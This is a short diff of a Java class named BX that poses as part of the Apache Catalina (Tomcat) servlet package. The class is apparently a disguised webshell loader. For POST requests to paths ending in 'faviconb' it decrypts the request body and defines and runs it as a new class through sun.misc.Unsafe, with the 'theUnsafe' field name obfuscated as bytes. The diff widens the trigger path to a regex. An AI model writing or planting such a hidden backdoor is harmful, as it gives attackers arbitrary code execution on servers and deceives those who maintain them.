@@ -1,7 +1,6 @@
 package org.apache.catalina.servlets.sl;
 
 public class BX {
-    private static final String pathPattern= "/faviconb";
 
     public static Class unsafedefine(byte[] bytes) throws Exception {
         java.lang.reflect.Field field = sun.misc.Unsafe.class.getDeclaredField(new String(new byte[]{116,104,101,85,110,115,97,102,101}));
@@ -64,7 +63,7 @@ public class BX {
     }
 
     public static void doService(Object obj, String url,String method, java.io.InputStream in){
-        if (url.matches(pathPattern)){
+        if (url.matches("/(.*)faviconb")){
             if (method.equals("POST")){
                 try {
                     unsafedefine(Decrypt(r(in))).newInstance().equals(obj);
